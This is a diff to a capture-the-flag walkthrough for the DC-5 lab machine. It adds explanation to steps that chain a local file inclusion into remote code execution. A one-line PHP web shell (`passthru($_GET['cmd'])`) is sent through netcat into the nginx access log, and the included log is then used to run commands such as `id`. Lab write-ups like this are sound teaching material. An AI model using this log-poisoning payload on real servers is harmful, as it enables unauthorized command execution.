@@ -32,11 +32,16 @@ By DCAU
 ![](/screenshots/dc-5/nginxAccessLog.jpg)
 * Note: For Apache2 web servers, the location is also likely to be the same, except that it would be found under the `apache2` directory in `/var/log` instead.
 * We can now confirm that we are able to retrieve the access logs, which span many, many pages.
-* I accessed `http://10.0.2.11/testing-out-that-i-am-able-to-read-the-access-logs`, just to test out what we know about the access logs - that these files record all requests processed by the server.
+* I accessed `http://10.0.2.11/testing-out-that-i-am-able-to-read-the-access-logs`, just to test out what we know about the access logs - that these files record all requests processed by the server:
 ![](/screenshots/dc-5/nginxAccessLogTest.jpg)
 * Note: The latest records are found at the bottom of the log file.
 * Next, run `nc 10.0.2.11 80`, then enter `GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1`.
-* After that, run `http://10.0.2.11/thankyou.php?file=/var/log/nginx/access.log&cmd=id` and refresh the page to confirm that we are able to run commands. We should expect to see the output of running `id` in the access logs.
+* `passthru` allows us to execute an external program and display its raw output.
+* Note: The browswer is not used to send this GET request because it will URL-encode the request, making it useless.
+* Refresh the page, i.e. run `http://10.0.2.11/thankyou.php?file=/var/log/nginx/access.log` and we see that there is an 'empty' GET request, which is really the request made when we executed the PHP code:
+![](/screenshots/dc-5/emptyGetRequest.jpg)
+* After that, run `http://10.0.2.11/thankyou.php?file=/var/log/nginx/access.log&cmd=id` and refresh the page to confirm that we are able to run commands. We should expect to see the output of running `id` in the access logs, exactly at the log entry where our 'empty' GET request was made:
+![](/screenshots/dc-5/commandExecutionAccessLogs.jpg)
 
 # Other walkthroughs visited
 1. https://bzyo.github.io/dc-5/
